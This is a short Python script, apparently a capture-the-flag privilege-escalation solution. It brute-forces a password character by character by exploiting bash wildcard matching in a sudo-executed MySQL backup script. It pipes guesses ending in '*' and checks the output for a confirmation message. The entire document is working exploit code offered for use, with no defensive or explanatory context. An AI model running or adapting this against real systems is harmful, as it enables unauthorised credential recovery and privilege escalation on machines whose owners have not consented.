#!/usr/bin/env python3

import signal
import string
import subprocess

SCRIPT = '/opt/scripts/mysql-backup.sh'
SUCCESS_MESSAGE = 'Password confirmed!'


def exit_signal_handler(signal, frame):
    print('[*] Stopped!')
    exit(1)


if __name__ == '__main__':
    print('[*] Cracking the password...')
    signal.signal(signal.SIGINT, exit_signal_handler)
    password = []
    password_found = False
    # Do not use string.printable or string.punctuation as valid chars to avoid bash wildcards
    valid_chars = string.ascii_letters + string.digits

    while not password_found:
        for c in valid_chars:
            cmd = f"echo {''.join(password)}{c}* | sudo {SCRIPT}"
            output = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

            if SUCCESS_MESSAGE in output:
                password.append(c)
                print(f"\r[+] Password: {''.join(password)}", end='')
                break
        else:
            password_found = True
            print('\n[*] Done!')
